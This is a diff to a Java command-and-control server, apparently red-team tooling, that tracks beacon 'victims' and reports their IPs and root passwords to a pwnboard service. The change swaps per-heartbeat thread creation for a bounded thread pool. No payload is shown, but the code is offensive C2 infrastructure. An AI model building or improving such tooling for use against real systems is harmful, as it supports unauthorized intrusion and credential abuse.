@@ -13,6 +13,10 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Scanner;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
 
 import org.json.JSONObject;
 
@@ -68,6 +72,10 @@ public class C2Server implements Runnable{
     private String root_password;
     private String pwnboard_api_key;
 
+    // Shared, bounded pool for pwnboard notifications so we don't spawn a new
+    // Thread on every beacon heartbeat
+    private final ExecutorService pwnBoardPool;
+
     /**
      * Initializes a Command and Control Server to handle connections from Long Range Beacons
      * Long Range Beacons handle all of the clients (victims)
@@ -90,6 +98,13 @@ public class C2Server implements Runnable{
         this.beaconClientHttpsMap = new HashMap<>();
         this.beaconClientDnsMap = new HashMap<>();
         this.isBeaconHTTP = new HashMap<>();
+        // core=2, max=8, 60s keep-alive, bounded queue of 500.
+        // CallerRunsPolicy applies backpressure instead of spawning unbounded
+        // threads or silently dropping updates when the queue fills.
+        this.pwnBoardPool = new ThreadPoolExecutor(
+                2, 8, 60, TimeUnit.SECONDS,
+                new ArrayBlockingQueue<>(500),
+                new ThreadPoolExecutor.CallerRunsPolicy());
     }
 
     
@@ -159,7 +174,8 @@ public class C2Server implements Runnable{
      * Stops the server
      */
     protected void stopServer(){
-        sentinel = false; 
+        sentinel = false;
+        pwnBoardPool.shutdown();
         try{
             serverSocket.close();
         } catch (IOException e){
@@ -440,16 +456,12 @@ public class C2Server implements Runnable{
 
     protected void updateDnsClientLastSeen(String IPAddress){
         dnsClientLastSeen.put(IPAddress, new Time(System.currentTimeMillis()));
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key);
-        Thread pwnBoardReqThread = new Thread(pwnBoardReq);
-        pwnBoardReqThread.start();
+        pwnBoardPool.submit(new pwnBoardRequest(IPAddress, "https", "root", root_password, pwnboard_api_key));
     }
 
     protected void updateBeaconClientHttpsMap(String clientIP, String beaconIP){
         beaconClientHttpsMap.put(clientIP, beaconIP);
-        pwnBoardRequest pwnBoardReq = new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key);
-        Thread pwnBoardReqThread = new Thread(pwnBoardReq);
-        pwnBoardReqThread.start();
+        pwnBoardPool.submit(new pwnBoardRequest(clientIP, "https", "root", root_password, pwnboard_api_key));
     }
 
     protected void updateBeaconClientDnsMap(String clientIP, String beaconIP){
